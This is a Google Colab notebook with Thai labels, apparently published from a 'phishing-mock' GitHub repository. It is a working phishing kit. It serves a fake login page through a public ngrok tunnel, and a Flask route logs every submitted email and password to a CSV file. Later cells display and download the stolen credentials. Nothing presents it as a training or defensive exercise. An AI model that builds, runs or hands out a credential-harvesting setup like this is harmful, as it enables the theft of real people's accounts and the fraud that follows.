{
  "nbformat": 4,
  "nbformat_minor": 0,
  "metadata": {
    "colab": {
      "name": "BoszGTec_phishing_mock_THVer.ipynb",
      "provenance": [],
      "include_colab_link": true
    },
    "kernelspec": {
      "name": "python3",
      "display_name": "Python 3"
    }
  },
  "cells": [
    {
      "cell_type": "markdown",
      "metadata": {
        "id": "view-in-github",
        "colab_type": "text"
      },
      "source": [
        "<a href=\"https://colab.research.google.com/github/BoszGTec/phishing-mock/blob/main/gcolab/BoszGTec_phishing_mock_THVer.ipynb\" target=\"_parent\"><img src=\"https://colab.research.google.com/assets/colab-badge.svg\" alt=\"Open In Colab\"/></a>"
      ]
    },
    {
      "cell_type": "markdown",
      "source": [
        "# BoszGT-ph\n",
        "---\n",
        "สร้างโดย bossgeeg123456 \n",
        "GitHub : https://github.com/BoszGTec <br>"
      ],
      "metadata": {
        "id": "QJZIb3XklHgb"
      }
    },
    {
      "cell_type": "code",
      "metadata": {
        "id": "skDf57admDOe",
        "cellView": "form"
      },
      "source": [
        "#@title # Clone Repo\n",
        "from IPython import display\n",
        "%cd /content\n",
        "!git clone https://github.com/BoszGTec/phishing-mock.git\n",
        "display.clear_output()"
      ],
      "execution_count": null,
      "outputs": []
    },
    {
      "cell_type": "code",
      "source": [
        "#@title # ติดตั้งไลบรารี\n",
        "from IPython import display\n",
        "%cd \"phishing-mock\"\n",
        "!pip install -r requirements.txt\n",
        "%cd /content\n",
        "display.clear_output()"
      ],
      "metadata": {
        "cellView": "form",
        "id": "ChbG6NPDghqr"
      },
      "execution_count": null,
      "outputs": []
    },
    {
      "cell_type": "code",
      "source": [
        "#@title ใช้ร่วมกับ Ngrok\n",
        "from pyngrok import ngrok\n",
        "#@markdown หา รหัสยืนยันAuth ได้จาก : https://ngrok.com/\n",
        "Auth = \"\" #@param {type:\"string\"}\n",
        "\n",
        "ngrok.set_auth_token(Auth)\n",
        "Link=ngrok.connect(\"5000\")\n",
        "Link"
      ],
      "metadata": {
        "cellView": "form",
        "id": "96vezi9hg8YT"
      },
      "execution_count": null,
      "outputs": []
    },
    {
      "cell_type": "code",
      "source": [
        "#@title เริ่มการทำงาน\n",
        "แบบเว็บ = \"index.html\" #@param [\"index.html\", \"face.html\"]\n",
        "from flask import Flask , render_template ,  request\n",
        "app = Flask(__name__)\n",
        "print(\"By bossgeeg123456 : https://github.com/BoszGTec\")\n",
        "path=\"/content/phishing-mock/\"\n",
        "with open(path+\"Email+Password.csv\",mode='w') as f :\n",
        "    f.write(\"\"\"Email , Password\"\"\")\n",
        "    f.close()\n",
        "\n",
        "\n",
        "app.static_folder=path+\"file\"\n",
        "app.template_folder=path+\"file\"\n",
        "@app.route(\"/\") \n",
        "def index():\n",
        " return render_template(page)\n",
        "\n",
        "@app.route(\"/login\") \n",
        "def fake_login() :\n",
        "  e=request.args.get(\"email\")\n",
        "  p=request.args.get(\"password\")\n",
        "  with open(path+\"Email+Password.csv\",mode='a') as f :\n",
        "    f.write(\"\"\"\n",
        "    {0} , {1} \"\"\".format(e,p))\n",
        "    f.close()\n",
        "  return \"\"\"\n",
        "  <link href=\"https://cdn.jsdelivr.net/npm/bootstrap@5.1.3/dist/css/bootstrap.min.css\" rel=\"stylesheet\" integrity=\"sha384-1BmE4kWBq78iYhFldvKuhfTAU6auU8tT94WrHftjDbrCEXSU1oBoqyl2QvZ6jIW3\" crossorigin=\"anonymous\">\n",
        "  <h1>You Got phishing Now !! Email:{0} Password:{1}</h1>\n",
        "  \"\"\".format(e,p)\n",
        "\n",
        "\n",
        "app.run()"
      ],
      "metadata": {
        "cellView": "form",
        "id": "4PbcBWpOgsva"
      },
      "execution_count": null,
      "outputs": []
    },
    {
      "cell_type": "code",
      "source": [
        "#@title แสดงข้อมูล\n",
        "import pandas as pd\n",
        "%cd \"/content/phishing-mock\"\n",
        "Email_Password= pd.read_csv(\"Email+Password.csv\")\n",
        "Email_Password"
      ],
      "metadata": {
        "cellView": "form",
        "id": "3xComqfsjrIS"
      },
      "execution_count": null,
      "outputs": []
    },
    {
      "cell_type": "code",
      "source": [
        "#@title ดาวน์โหลดข้อมูล(เป็นไฟล์ csv)\n",
        "from google.colab import files\n",
        "%cd \"/content/phishing-mock\"\n",
        "files.download('Email+Password.csv')"
      ],
      "metadata": {
        "cellView": "form",
        "id": "tXRO5cF-lXER"
      },
      "execution_count": null,
      "outputs": []
    }
  ]
}
